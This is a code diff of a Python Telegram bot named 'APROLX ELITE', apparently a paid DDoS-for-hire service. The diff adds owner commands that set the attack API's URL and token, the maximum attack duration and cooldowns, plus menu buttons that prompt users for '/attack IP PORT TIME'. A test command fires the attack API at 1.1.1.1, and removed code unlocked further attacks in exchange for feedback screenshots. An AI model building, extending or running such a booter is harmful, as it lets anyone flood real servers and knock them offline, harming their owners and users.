-        bot.reply_to(message, f"❌ User {uid} not banned.")
+def cmd_unban(msg):
+    if not is_owner(msg.from_user.id): return
+    p = msg.text.split()
+    if len(p) < 2: bot.reply_to(msg, "⚠️ /unban ID"); return
+    if p[1] in data["banned_users"]:
+        del data["banned_users"][p[1]]; save_data(data)
+        bot.reply_to(msg, "✅ Unbanned")
+    else: bot.reply_to(msg, "❌ Not banned")
 
-# ============= FEEDBACK PHOTO HANDLER =============
-@bot.message_handler(content_types=['photo'])
-def handle_photo(message):
-    user_id = message.from_user.id
-    user_rec = data["users"].get(str(user_id))
-    
-    if user_rec and user_rec.get("pending_feedback"):
-        user_rec["pending_feedback"] = False
-        save_data(data)
-        
-        username = message.from_user.username or message.from_user.first_name
-        bot.reply_to(message, "✅ 𝐅𝐄𝐄𝐃𝐁𝐀𝐂𝐊 𝐑𝐄𝐂𝐄𝐈𝐕𝐄𝐃!\n\nYour next attack is now unlocked! 🔥")
-        
-        ch = get_setting("feedback_channel", None)
-        if ch:
-            try:
-                caption = f"🔥 𝐀𝐏𝐑𝐎𝐋𝐗 𝐅𝐄𝐄𝐃𝐁𝐀𝐂𝐊 🔥\n👤 User: @{username}\n🆔 ID: {user_id}\n✅ Status: UNLOCKED"
-                bot.send_photo(ch, message.photo[-1].file_id, caption=caption)
-            except:
-                pass
-    else:
-        bot.reply_to(message, "📸 Nice screenshot! Use /attack to launch an attack.")
+@bot.message_handler(commands=['setapi'])
+def cmd_setapi(msg):
+    if not is_owner(msg.from_user.id): return
+    p = msg.text.split()
+    if len(p) < 3: bot.reply_to(msg, "⚠️ /setapi URL TOKEN"); return
+    set_setting("api_url", p[1]); set_setting("api_token", p[2])
+    if len(p) > 3: set_setting("api_method", p[3])
+    if len(p) > 4: set_setting("api_geolocation", p[4])
+    bot.reply_to(msg, "✅ API Updated!")
 
-# ============= MAIN LOOP =============
-print("""
-╔══════════════════════════════════════════════════════════════╗
-║   🔥 APROLX ELITE V21 IS LIVE NOW                            ║
-║   Railway / Termux Hosting Optimized                         ║
-╚══════════════════════════════════════════════════════════════╝""")
-print(f"👑 Master Owner: {BOT_OWNER}")
-print(f"📊 Users: {len(data['users'])}")
-print(f"🔑 Keys: {len(data['keys'])}")
-print(f"📡 API: {get_setting('api_url')}")
-print("✅ Bot is running and polling...")
+@bot.message_handler(commands=['testapi'])
+def cmd_testapi(msg):
+    if not is_owner(msg.from_user.id): return
+    ok, r = api_attack("1.1.1.1", 80, 5)
+    if ok: bot.reply_to(msg, f"✅ <b>API OK</b>\n<code>{r[:300]}</code>", parse_mode="HTML")
+    else: bot.reply_to(msg, f"❌ <b>API FAILED</b>\n<code>{r[:300]}</code>", parse_mode="HTML")
+
+@bot.message_handler(commands=['setmaxtime'])
+def cmd_setmaxtime(msg):
+    if not is_owner(msg.from_user.id): return
+    p = msg.text.split()
+    if len(p) < 2: bot.reply_to(msg, "⚠️ /setmaxtime SEC"); return
+    set_setting("max_attack_time", int(p[1]))
+    bot.reply_to(msg, f"✅ Max: {p[1]}s")
+
+@bot.message_handler(commands=['setcooldown'])
+def cmd_setcooldown(msg):
+    if not is_owner(msg.from_user.id): return
+    p = msg.text.split()
+    if len(p) < 2: bot.reply_to(msg, "⚠️ /setcooldown SEC"); return
+    set_setting("user_cooldown", int(p[1]))
+    bot.reply_to(msg, f"✅ Cooldown: {p[1]}s")
+
+@bot.message_handler(commands=['maintenance'])
+def cmd_maintenance(msg):
+    if not is_owner(msg.from_user.id): return
+    cur = get_setting('maintenance_mode', False)
+    set_setting("maintenance_mode", not cur)
+    bot.reply_to(msg, f"✅ Maintenance: {'ON' if not cur else 'OFF'}")
+
+# ============= BUTTONS =============
+@bot.message_handler(func=lambda m: m.text == "🔥 ATTACK")
+def btn_attack(msg):
+    bot.reply_to(msg, "🎯 <code>/attack IP PORT TIME</code>", parse_mode="HTML")
+
+@bot.message_handler(func=lambda m: m.text == "📊 STATUS")
+def btn_status(msg): cmd_status(msg)
+
+@bot.message_handler(func=lambda m: m.text == "👤 PROFILE")
+def btn_profile(msg): cmd_profile(msg)
+
+@bot.message_handler(func=lambda m: m.text == "👑 OWNER PANEL")
+def btn_owner(msg):
+    if not is_owner(msg.from_user.id): return
+    bot.reply_to(msg, "👑 <b>PANEL</b>", reply_markup=kb_owner(), parse_mode="HTML")
+
+@bot.message_handler(func=lambda m: m.text == "🔑 REDEEM")
+def btn_redeem(msg):
+    bot.reply_to(msg, "🔑 <code>/redeem KEY</code>", parse_mode="HTML")
+
+@bot.message_handler(func=lambda m: m.text == "🔑 GEN KEY")
+def btn_genkey(msg):
+    bot.reply_to(msg, "🔑 <code>/genkey DAYS AMOUNT</code>", parse_mode="HTML")
+
+@bot.message_handler(func=lambda m: m.text == "📊 STATS")
+def btn_stats(msg): cmd_stats(msg)
+
+@bot.message_handler(func=lambda m: m.text == "👥 USERS")
+def btn_users(msg): cmd_users(msg)
+
+@bot.message_handler(func=lambda m: m.text == "📢 BROADCAST")
+def btn_broadcast(msg):
+    bot.reply_to(msg, "📢 <code>/broadcast MSG</code>", parse_mode="HTML")
+
+@bot.message_handler(func=lambda m: m.text == "⚙️ SETTINGS")
+def btn_settings(msg):
+    bot.reply_to(msg, "⚙️ <code>/setapi URL TOKEN</code>\n<code>/setmaxtime SEC</code>\n<code>/setcooldown SEC</code>", parse_mode="HTML")
+
+@bot.message_handler(func=lambda m: m.text == "❌ CLOSE")
+def btn_close(msg):
+    bot.reply_to(msg, "❌ Closed.", reply_markup=kb_main(msg.from_user.id))
+
+# ============= MAIN =============
+print("=" * 55)
+print("  🔥 APROLX ELITE V22 - POLLING MODE")
+print("=" * 55)
+print(f"  👑 Owner: {BOT_OWNER}")
+print(f"  📡 API: {get_setting('api_url', DEFAULT_API_URL)}")
+print("=" * 55)
+print("  ✅ Bot running...")
+print("=" * 55)
 
 while True:
     try:
         bot.remove_webhook()
-        bot.polling(none_stop=True, interval=0, timeout=20)
+        time.sleep(0.5)
+        bot.polling(
+            none_stop=True,
+            interval=0,
+            timeout=20,
+            long_polling_timeout=15,
+            allowed_updates=["message", "callback_query"]
+        )
+    except KeyboardInterrupt:
+        print("\n🛑 Bot stopped.")
+        break
     except Exception as e:
-        print(f"Polling Error: {e}")
+        print(f"⚠️ Polling Error: {e}")
         time.sleep(3)
